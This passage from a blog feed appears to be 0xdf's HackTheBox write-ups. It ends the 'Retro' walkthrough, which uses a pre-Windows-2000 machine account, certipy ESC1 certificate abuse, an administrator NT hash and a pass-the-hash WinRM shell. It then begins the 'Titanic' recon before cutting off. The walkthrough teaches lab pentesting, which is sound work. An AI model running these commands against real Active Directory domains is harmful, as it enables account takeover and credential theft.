10.129.234.44 445 DC </span><span class="netexec-logfail">[-]</span><span class="go"> retro.vl\BANKING$:oxdf STATUS_LOGON_FAILURE </span></code></pre></div></div> <p>That’s a good indication that it’s the correct password. In fact, the TrustedSec post addresses this:</p> <blockquote> <p>You will see the error message <strong>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</strong> when you have guessed the correct password for a computer account that has not been used yet.</p> </blockquote> <p>I’ll show two ways to get around this error - via password change and via Kerberos authentication.</p> <h4 id="via-password-change">via Password Change</h4> <p>The TrustedSec post goes on to say that to use this account, I’ll just need to change the password. I can’t do it over SMB (as it won’t accept the pre-2000 auth), but I can use one of several different protocols:</p> <blockquote> <ol> <li>The NetUserChangePassword protocol</li> <li>The NetUserSetInfo protocol</li> <li>The Kerberos change-password protocol (IETF Internet Draft Draft-ietf-cat-kerb-chg-password-02.txt) - port 464</li> <li>Kerberos set-password protocol (IETF Internet Draft Draft-ietf-cat-kerberos-set-passwd-00.txt) - port 464</li> <li>Lightweight Directory Access Protocol (LDAP) write-password attribute (if 128-bit Secure Sockets Layer (SSL) is used)</li> <li>XACT-SMB for pre-Microsoft Windows NT (LAN Manager) compatibility</li> </ol> </blockquote> <p>The posts links to <a href="https://github.com/fortra/impacket/pull/1304">this pull request into Impacket</a> which is closed saying that <code class="language-plaintext highlighter-rouge">changepasswd.py</code> can handle it.</p> <p>If I try this with just the target and the new password, it crashes with the same error mentioned in the post:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>changepasswd.py <span class="nt">-newpass</span> 0xdf0xdf <span class="s1">'retro.vl/BANKING$:banking@dc.retro.vl'</span> <span class="go">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><span class="gp">[*] Changing the password of retro.vl\BANKING$</span><span class="w"> </span><span class="gp">[*] Connecting to DCE/RPC as retro.vl\BANKING$</span><span class="w"> </span><span class="go">Traceback (most recent call last): File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.12/site-packages/impacket/smbconnection.py", line 280, in login return self._SMBConnection.login(user, password, domain, lmhash, nthash) ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.12/site-packages/impacket/smb3.py", line 1091, in login if packet.isValidAnswer(STATUS_SUCCESS): ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.12/site-packages/impacket/smb3structs.py", line 460, in isValidAnswer raise smb3.SessionError(self['Status'], self) impacket.smb3.SessionError: SMB SessionError: STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT(The account used is a computer account. Use your global user account or local user account to access this server.) </span></code></pre></div></div> <p>However, in the help there’s an option for to set the protocol:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go"> -protocol {smb-samr,rpc-samr,kpasswd,ldap}, -p {smb-samr,rpc-samr,kpasswd,ldap} </span></code></pre></div></div> <p>I’ll use RPC:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>changepasswd.py <span class="nt">-newpass</span> 0xdf0xdf <span class="s1">'retro.vl/BANKING$:banking@dc.retro.vl'</span> <span class="nt">-protocol</span> rpc-samr <span class="go">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Changing the password of retro.vl\BANKING$ [*] Connecting to DCE/RPC as retro.vl\BANKING$ [*] Password was changed successfully. </span></code></pre></div></div> <p>It works:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb dc.retro.vl <span class="nt">-u</span> <span class="s1">'banking$'</span> <span class="nt">-p</span> 0xdf0xdf <span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-logsuccess">[+]</span><span class="go"> retro.vl\banking$:0xdf0xdf </span></code></pre></div></div> <h4 id="via-kerberos-auth">via Kerberos Auth</h4> <p>On originally publishing this post, I got <a href="https://x.com/mpgn_x64/status/1937982462660911440">this reply from mpgn</a>:</p> <blockquote class="twitter-tweet"><p lang="en" dir="ltr">you don&#39;t need to change the password of a pre2k computer account, just use kerberos ex:<br /><br />nxc smb ip -u server$ -p server -k <br /><br />if you want the tgt (for other tools)<br /><br />nxc smb ip -u server$ -p server -k --generate-tgt ticket<br /><br />I don&#39;t know why everyone is changing the password 🤷‍♂️</p>&mdash; mpgn (@mpgn_x64) <a href="https://twitter.com/mpgn_x64/status/1937982462660911440?ref_src=twsrc%5Etfw">June 25, 2025</a></blockquote> <script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script> <p>That actually does work here (on a fresh boot of Retro):</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>netexec smb dc.retro.vl <span class="nt">-u</span> <span class="s1">'BANKING$'</span> <span class="nt">-p</span> banking <span class="nt">-k</span> <span class="netexec-protocol">SMB </span><span class="go"> dc.retro.vl 445 DC </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> dc.retro.vl 445 DC </span><span class="netexec-logsuccess">[+]</span><span class="go"> retro.vl\BANKING$:banking </span></code></pre></div></div> <h2 id="shell-as-administrator">Shell as Administrator</h2> <h3 id="enumeration-1">Enumeration</h3> <p>BANKING$ has the same SMB access as Trainee. I don’t have a way to get a shell. I’ll turn to ADCS.</p> <p>I have <code class="language-plaintext highlighter-rouge">certipy</code> search for any vulnerable templates:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>certipy find <span class="nt">-u</span> <span class="s1">'BANKING$@retro.vl'</span> <span class="nt">-p</span> 0xdf0xdf <span class="nt">-vulnerable</span> <span class="nt">-stdout</span> <span class="go">Certipy v5.0.2 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 34 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 12 enabled certificate templates [*] Finding issuance policies [*] Found 15 issuance policies [*] Found 0 OIDs linked to templates [*] Retrieving CA configuration for 'retro-DC-CA' via RRP [*] Successfully retrieved CA configuration for 'retro-DC-CA' [*] Checking web enrollment for CA 'retro-DC-CA' @ 'DC.retro.vl' [!] Error checking web enrollment: timed out [!] Use -debug to print a stacktrace [!] Error checking web enrollment: timed out [!] Use -debug to print a stacktrace [*] Enumeration output: Certificate Authorities 0 CA Name : retro-DC-CA DNS Name : DC.retro.vl Certificate Subject : CN=retro-DC-CA, DC=retro, DC=vl Certificate Serial Number : 7A107F4C115097984B35539AA62E5C85 Certificate Validity Start : 2023-07-23 21:03:51+00:00 Certificate Validity End : 2028-07-23 21:13:50+00:00 Web Enrollment HTTP Enabled : False HTTPS Enabled : False User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Active Policy : CertificateAuthority_MicrosoftDefault.Policy Permissions Owner : RETRO.VL\Administrators Access Rights ManageCa : RETRO.VL\Administrators RETRO.VL\Domain Admins RETRO.VL\Enterprise Admins ManageCertificates : RETRO.VL\Administrators RETRO.VL\Domain Admins RETRO.VL\Enterprise Admins Enroll : RETRO.VL\Authenticated Users Certificate Templates 0 Template Name : RetroClients Display Name : Retro Clients Certificate Authorities : retro-DC-CA Enabled : True Client Authentication : True Enrollment Agent : False Any Purpose : False Enrollee Supplies Subject : True Certificate Name Flag : EnrolleeSuppliesSubject Extended Key Usage : Client Authentication Requires Manager Approval : False Requires Key Archival : False Authorized Signatures Required : 0 Schema Version : 2 Validity Period : 1 year Renewal Period : 6 weeks Minimum RSA Key Length : 4096 Template Created : 2023-07-23T21:17:47+00:00 Template Last Modified : 2023-07-23T21:18:39+00:00 Permissions Enrollment Permissions Enrollment Rights : RETRO.VL\Domain Admins RETRO.VL\Domain Computers RETRO.VL\Enterprise Admins Object Control Permissions Owner : RETRO.VL\Administrator Full Control Principals : RETRO.VL\Domain Admins RETRO.VL\Enterprise Admins Write Owner Principals : RETRO.VL\Domain Admins RETRO.VL\Enterprise Admins Write Dacl Principals : RETRO.VL\Domain Admins RETRO.VL\Enterprise Admins Write Property Enroll : RETRO.VL\Domain Admins RETRO.VL\Domain Computers RETRO.VL\Enterprise Admins [+] User Enrollable Principals : RETRO.VL\Domain Computers [!] Vulnerabilities ESC1 : Enrollee supplies subject and template allows client authentication. </span></code></pre></div></div> <p>It find a template that shows as vulnerable to ESC1.</p> <p>If I had gone the Kerberos route instead of changing the password, the command would require adding <code class="language-plaintext highlighter-rouge">-k</code> and <code class="language-plaintext highlighter-rouge">-target dc.retro.vl</code>. Other <code class="language-plaintext highlighter-rouge">certipy</code> commands work as well, and may require adding an extra switch. Typically when it fails it says what argument needs to be added.</p> <h3 id="esc1">ESC1</h3> <h4 id="background">Background</h4> <p>There’s a lot in the <code class="language-plaintext highlighter-rouge">certipy</code> output. There’s a single CA named <code class="language-plaintext highlighter-rouge">retro-DC-CA</code>. It doesn’t show anything unusual.</p> <p>There is one vulnerable template, <code class="language-plaintext highlighter-rouge">RetroClients</code>, which is configured with <code class="language-plaintext highlighter-rouge">Enrollee Supplies Subject</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go"> Enrollee Supplies Subject : True Certificate Name Flag : EnrolleeSuppliesSubject </span></code></pre></div></div> <p>This means that the enrollee can specify what user they want the certificate for!</p> <p>Additionally, the <code class="language-plaintext highlighter-rouge">Extended Key Usage</code> field is set to <code class="language-plaintext highlighter-rouge">Client Authentication</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go"> Extended Key Usage : Client Authentication </span></code></pre></div></div> <p>This means that the certificate can be used to authenticating a user to a service. Without this, the resulting certificate wouldn’t be too valuable to me.</p> <p>To enroll in this certificate, a user must be in one of these groups:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go"> Enrollment Rights : RETRO.VL\Domain Admins RETRO.VL\Domain Computers RETRO.VL\Enterprise Admins </span></code></pre></div></div> <p>BANKING$ is in Domain Computers!</p> <h4 id="exploit">Exploit</h4> <p>I’ll use <code class="language-plaintext highlighter-rouge">certipy</code> to request a certificate, authenticating as BANKING$ but requesting the UPN of administrator@retro.vl:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>certipy req <span class="nt">-u</span> <span class="s1">'BANKING$@retro.vl'</span> <span class="nt">-p</span> 0xdf0xdf <span class="nt">-ca</span> retro-DC-CA <span class="nt">-template</span> RetroClients <span class="nt">-upn</span> administrator@retro.vl <span class="go">Certipy v5.0.2 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [*] Request ID is 13 [-] Got error while requesting certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template. Would you like to save the private key? (y/N): [-] Failed to request certificate </span></code></pre></div></div> <p>It fails. The public key length is too small for the template. In the <code class="language-plaintext highlighter-rouge">-h</code> for <code class="language-plaintext highlighter-rouge">certipy</code>, there’s a way to set this:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go"> -key-size RSA key length Length of RSA key (default: 2048) </span></code></pre></div></div> <p>I’ll double it, and it works:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>certipy req <span class="nt">-u</span> <span class="s1">'BANKING$@retro.vl'</span> <span class="nt">-p</span> 0xdf0xdf <span class="nt">-ca</span> retro-DC-CA <span class="nt">-template</span> RetroClients <span class="nt">-upn</span> administrator@retro.vl <span class="nt">-key-size</span> 4096 <span class="go">Certipy v5.0.2 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [*] Request ID is 15 [*] Successfully requested certificate [*] Got certificate with UPN 'administrator@retro.vl' [*] Certificate has no object SID [*] Try using -sid to set the object SID or see the wiki for more details [*] Saving certificate and private key to 'administrator.pfx' [*] Wrote certificate and private key to 'administrator.pfx' </span></code></pre></div></div> <p>Now I’ll use this certificate to auth as administrator:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>certipy auth <span class="nt">-pfx</span> administrator.pfx <span class="nt">-dc-ip</span> 10.129.234.44 <span class="go">Certipy v5.0.2 - by Oliver Lyak (ly4k) [*] Certificate identities: [*] SAN UPN: 'administrator@retro.vl' [*] Using principal: 'administrator@retro.vl' [*] Trying to get TGT... [-] Object SID mismatch between certificate and user 'administrator' [-] See the wiki for more information </span></code></pre></div></div> <p>This fails too. It says there’s a SID mismatch. I can try the request again, this time giving the SID as well. I’ll get the SID for the administrator user using <code class="language-plaintext highlighter-rouge">lookupsid.py</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>lookupsid.py retro.vl/BANKING<span class="nv">$:</span>0xdf0xdf@dc.retro.vl <span class="go">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Brute forcing SIDs at dc.retro.vl [*] StringBinding ncacn_np:dc.retro.vl[\pipe\lsarpc] [*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172 498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup) 500: RETRO\Administrator (SidTypeUser) 501: RETRO\Guest (SidTypeUser) 502: RETRO\krbtgt (SidTypeUser) 512: RETRO\Domain Admins (SidTypeGroup) 513: RETRO\Domain Users (SidTypeGroup) 514: RETRO\Domain Guests (SidTypeGroup) 515: RETRO\Domain Computers (SidTypeGroup) 516: RETRO\Domain Controllers (SidTypeGroup) 517: RETRO\Cert Publishers (SidTypeAlias) 518: RETRO\Schema Admins (SidTypeGroup) 519: RETRO\Enterprise Admins (SidTypeGroup) 520: RETRO\Group Policy Creator Owners (SidTypeGroup) 521: RETRO\Read-only Domain Controllers (SidTypeGroup) 522: RETRO\Cloneable Domain Controllers (SidTypeGroup) 525: RETRO\Protected Users (SidTypeGroup) 526: RETRO\Key Admins (SidTypeGroup) 527: RETRO\Enterprise Key Admins (SidTypeGroup) 553: RETRO\RAS and IAS Servers (SidTypeAlias) 571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias) 572: RETRO\Denied RODC Password Replication Group (SidTypeAlias) 1000: RETRO\DC$ (SidTypeUser) 1101: RETRO\DnsAdmins (SidTypeAlias) 1102: RETRO\DnsUpdateProxy (SidTypeGroup) 1104: RETRO\trainee (SidTypeUser) 1106: RETRO\BANKING$ (SidTypeUser) 1107: RETRO\jburley (SidTypeUser) 1108: RETRO\HelpDesk (SidTypeGroup) 1109: RETRO\tblack (SidTypeUser) </span></code></pre></div></div> <p>Now I’ll make the request specifying the SID:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>certipy req <span class="nt">-u</span> <span class="s1">'BANKING$@retro.vl'</span> <span class="nt">-p</span> 0xdf0xdf <span class="nt">-ca</span> retro-DC-CA <span class="nt">-template</span> RetroClients <span class="nt">-upn</span> administrator@retro.vl <span class="nt">-sid</span> S-1-5-21-2983547755-698260136-4283918172-500 <span class="nt">-key-size</span> 4096 <span class="go">Certipy v5.0.2 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [*] Request ID is 19 [*] Successfully requested certificate [*] Got certificate with UPN 'administrator@retro.vl' [*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500' [*] Saving certificate and private key to 'administrator.pfx' File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y [*] Wrote certificate and private key to 'administrator.pfx' </span></code></pre></div></div> <p>And now auth:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>certipy auth <span class="nt">-pfx</span> administrator.pfx <span class="nt">-dc-ip</span> 10.129.234.44 <span class="go">Certipy v5.0.2 - by Oliver Lyak (ly4k) [*] Certificate identities: [*] SAN UPN: 'administrator@retro.vl' [*] SAN URL SID: 'S-1-5-21-2983547755-698260136-4283918172-500' [*] Security Extension SID: 'S-1-5-21-2983547755-698260136-4283918172-500' [*] Using principal: 'administrator@retro.vl' [*] Trying to get TGT... [*] Got TGT [*] Saving credential cache to 'administrator.ccache' [*] Wrote credential cache to 'administrator.ccache' [*] Trying to retrieve NT hash for 'administrator' [*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389 </span></code></pre></div></div> <p>Finally I have both a TGT and the NTLM for administrator.</p> <h3 id="shell">Shell</h3> <p>This is all I need to WinRM with <a href="https://github.com/adityatelange/evil-winrm-py">evil-winrm-py</a>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>evil-winrm-py <span class="nt">-i</span> dc.retro.vl <span class="nt">-u</span> administrator <span class="nt">-H</span> 252fac7066d93dd009d4fd2cd0368389 <span class="go"> ▘▜ ▘ █▌▌▌▌▐ ▄▖▌▌▌▌▛▌▛▘▛▛▌▄▖▛▌▌▌ ▙▖▚▘▌▐▖ ▚▚▘▌▌▌▌ ▌▌▌ ▙▌▙▌ ▌ ▄▌ v0.0.8 [*] Connecting to dc.retro.vl:5985 as administrator </span><span class="gp">evil-winrm-py PS C:\Users\Administrator\Documents&gt;</span><span class="w"> </span></code></pre></div></div> <p>And grab the root flag:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">evil-winrm-py PS C:\Users\Administrator\desktop&gt; </span><span class="n">cat</span><span class="w"> </span><span class="nx">root.txt</span><span class="w"> </span><span class="go">40fce9c3************************ </span></code></pre></div></div> ]]>
</content>
<author>
<name/>
</author>
<category term="ctf"/>
<category term="hackthebox"/>
<category term="htb-retro"/>
<category term="pentest"/>
<category term="bug-bounty"/>
<category term="htb-retro"/>
<category term="hackthebox"/>
<category term="ctf"/>
<category term="nmap"/>
<category term="vulnlab"/>
<category term="windows"/>
<category term="active-directory"/>
<category term="netexec"/>
<category term="rid-cycle"/>
<category term="pre-windows-2000"/>
<category term="htb-vintage"/>
<category term="changepasswd-py"/>
<category term="certipy"/>
<category term="adcs"/>
<category term="esc1"/>
<summary type="html">
<![CDATA[ Retro starts with an SMB share and note about a trainee account that uses the username as the password. From there, I’ll find a machine account that’s old and has the pre-Windows 2000 password set. That account allows me access to ESC a vulnerable ADCS template, providing administrator access. ]]>
</summary>
<media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xdf.gitlab.io/img/retro-cover.png"/>
<media:content xmlns:media="http://search.yahoo.com/mrss/" medium="image" url="https://0xdf.gitlab.io/img/retro-cover.png"/>
</entry>
<entry>
<title type="html">HTB: Titanic</title>
<link href="https://0xdf.gitlab.io/2025/06/21/htb-titanic.html" rel="alternate" type="text/html" title="HTB: Titanic"/>
<published>2025-06-21T13:45:00+00:00</published>
<updated>2025-06-21T13:45:00+00:00</updated>
<id>https://0xdf.gitlab.io/2025/06/21/htb-titanic</id>
<content type="html" xml:base="https://0xdf.gitlab.io/2025/06/21/htb-titanic.html">
<![CDATA[ <picture> <source type="image/webp" srcset="/img/titanic-cover.webp" /> <img loading="lazy" src="/img/titanic-cover.png" alt="Titanic" style="float: right; margin-right:50px; margin-left:50px; height:150px;" class="include_image " /> </picture> <p>Titanic offers a website and a Gitea instance with the source code. I’ll look at the source to identify a directory traversal / file read vulnerability. I’ll use that to read the Gitea DB and crack a hash from the users table. That password works over SSH as well. I’ll find a cron running as root that is running Image Magick on images in a given directory. I’ll exploit a CVE in Image Magick to get execution as root.</p> <h2 id="box-info">Box Info</h2> <!-- https://app.hackthebox.com/machines/648 --> <table> <thead> <tr> <th>Name</th> <th style="text-align: right"><a href="https://hackthebox.com/machines/titanic" target="_blank" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9">Titanic</a> <a href="https://hackthebox.com/machines/titanic" target="_blank"><picture style="float: right; padding-left: 20px;"><source type="image/webp" srcset="/icons/box-titanic.webp" /> <img src="/icons/box-titanic.png" alt="Titanic" class="img-av" /></picture></a><br /><a href="https://hackthebox.com/machines/titanic" target="_blank" style="font-size: small; color: white;">Play on HackTheBox</a></th> </tr> </thead> <tbody> <tr> <td>Release Date</td> <td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1890083550914854914">15 Feb 2025</a></td> </tr> <tr> <td>Retire Date</td> <td style="text-align: right">21 Jun 2025</td> </tr> <tr> <td>OS</td> <td style="text-align: right">Linux <picture><source type="image/webp" srcset="/icons/Linux.webp" /><img src="/icons/Linux.png" alt="Linux" class="img-os" /></picture></td> </tr> <tr> <td>Base Points</td> <td style="text-align: right"><span class="diff-Easy">Easy [20]</span></td> </tr> <tr> <td>Rated Difficulty</td> <td style="text-align: right"><picture><source type="image/webp" srcset="/img/titanic-diff.webp" /><img src="/img/titanic-diff.png" alt="Rated difficulty for Titanic" style="display: unset;" /></picture></td> </tr> <tr> <td>Radar Graph</td> <td style="text-align: right"><picture><source type="image/webp" srcset="/img/titanic-radar.webp" /><img src="/img/titanic-radar.png" alt="Radar chart for Titanic" style="display: unset;" /></picture></td> </tr> <tr> <td><picture><source type="image/webp" srcset="/icons/first-blood-user.webp" /><img src="/icons/first-blood-user.png" alt="First Blood User" style="display: unset" /></picture></td> <td style="text-align: right"><span class="blood-time">00:03:05</span><a href="https://app.hackthebox.com/users/87804" target="_blank" rel="noopener"><img alt="jazzpizazz" src="https://www.hackthebox.com/badge/image/87804" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> jazzpizazz</span></a><br /></td> </tr> <tr> <td><picture><source type="image/webp" srcset="/icons/first-blood-root.webp" /><img src="/icons/first-blood-root.png" alt="First Blood Root" style="display: unset" /></picture></td> <td style="text-align: right"><span class="blood-time">00:33:24</span><a href="https://app.hackthebox.com/users/1129266" target="_blank" rel="noopener"><img alt="Vz0n" src="https://www.hackthebox.com/badge/image/1129266" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> Vz0n</span></a><br /></td> </tr> <tr> <td>Creator</td> <td style="text-align: right"><a href="https://app.hackthebox.com/users/1253217" target="_blank" rel="noopener"><img alt="ruycr4ft" src="https://www.hackthebox.com/badge/image/1253217" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> ruycr4ft</span></a><br /></td> </tr> </tbody> </table> <h2 id="recon">Recon</h2> <h3 id="nmap">nmap</h3> <p><code class="language-plaintext highlighter-rouge">nmap</code> finds two open TCP ports, SSH (22) and HTTP (80):</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.10.11.55 <span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-19 13:45 EST Nmap scan report for 10.10.11.55 Host is up (0.087s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 6.87 seconds </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80 <span class="nt">-sCV</span> 10.10.11.55 <span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-19 13:58 EST Nmap scan report for 10.10.11.55 Host is up (0.085s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA) |_ 256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-server-header: Apache/2.4.52 (Ubuntu) |_http-title: Did not follow redirect to http://titanic.htb/ Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.68 seconds </span></code></pre></div></div> <p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH</a> and <a href="https://packages.ubuntu.com/search?keywords=apache2">Apache</a> versions, the host is likely running Ubuntu 22.04 jammy.</p> <h3 id="subdomain-fuzz">Subdomain Fuzz</h3> <p><code class="language-plaintext highlighter-rouge">nmap</code> shows that port 80 is sending a redirect to <code class="language-plaintext highlighter-rouge">titanic.htb</code>. I’ll use <code class="language-plaintext highlighter-rouge">ffuf</code> to fuzz for any subdomains of that domain that respond differently than the base domain:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ffuf <span class="nt">-u</span> http://10.10.11.55 <span class="nt">-H</span> <span class="s2">"Host: FUZZ.titanic.htb"</span> <span class="nt">-w</span> /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">-ac</span> <span class="go"> /'___\ /'___\ /'___\ /\ \__/ /\ \__/ __ __ /\ \__/ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ \ \_\ \ \_\ \ \____/ \ \_\ \/_/ \/_/ \/___/ \/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.11.55 :: Wordlist : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.titanic.htb :: Follow redirects : false :: Calibration : true :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ dev [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 101ms] :: Progress: [19966/19966] :: Job [1/1] :: 469 req/sec :: Duration: [0:00:43] :: Errors: 0 :: </span></code></pre></div></div> <p>I’ll add both to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file so I can interact with them:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.11.55 titanic.htb dev.titanic.htb </code></pre></div></div> <h3 id="titanichtb---tcp-80">titanic.htb - TCP 80</h3> <h4 id="site">Site</h4> <p>The site is for a cruise company:</p> <picture> <source type="image/webp" srcset="/img/image-20250219140747256.webp" /> <img loading="lazy" src="/img/image-20250219140747256.png" alt="image-20250219140747256" class="include_image " /> </picture> <p>None of the links on the page go anywhere, but the Book buttons pop an overlay form:</p> <picture> <source type="image/webp" srcset="/img/image-20250219141142778.webp" /> <img loading="lazy" src="/img/image-20250219141142778.png" alt="image-20250219141142778" class="include_image " /> </picture> <p>Submitting this returns a JSON file that gets downloaded to my host, with the name <code class="language-plaintext highlighter-rouge">[GUID].json</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>575d8716-99ea-48d8-b209-e3a8bec90696.json | jq <span class="nb">.</span> <span class="go">{ "name": "0xdf", "email": "0xdf@titanic.htb", "phone": "1111111111", "date": "2026-01-01", "cabin": "Standard" } </span></code></pre></div></div> <h4 id="tech-stack">Tech Stack</h4> <p>The HTTP headers show the site is running on Werkzeug Python:</p> <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span> <span class="na">Date</span><span class="p">:</span> <span class="s">Wed, 19 Feb 2025 19:08:48 GMT</span> <span class="na">Server</span><span class="p">:</span> <span class="s">Werkzeug/3.0.3 Python/3.10.12</span> <span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span> <span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span> <span class="na">Keep-Alive</span><span class="p">:</span> <span class="s">timeout=5, max=100</span> <span class="na">Connection</span><span class="p">:</span> <span class="s">Keep-Alive</span> <span class="na">Content-Length</span><span class="p">:</span> <span class="s">7399</span> </code></pre></div></div> <p>This is almost certainly Flask. The 404 page matches the <a href="/cheatsheets/404#flask">default Flask 404</a>:</p> <picture> <source type="image/webp" srcset="/img/image-20250219140947377.webp" /> <img loading="lazy" src="/img/image-20250219140947377.png" alt="image-20250219140947377" class="include_image " /> </picture> <p>Wappalyzer agrees:</p> <picture> <source type="image/webp" srcset="/img/image-20250219141010899.webp" /> <img loading="lazy" src="/img/image-20250219141010899.png" alt="image-20250219141010899" class="include_image " /> </picture> <h4 id="directory-brute-force">Directory Brute Force</h4> <p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, but it doesn’t find anything interesting:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span 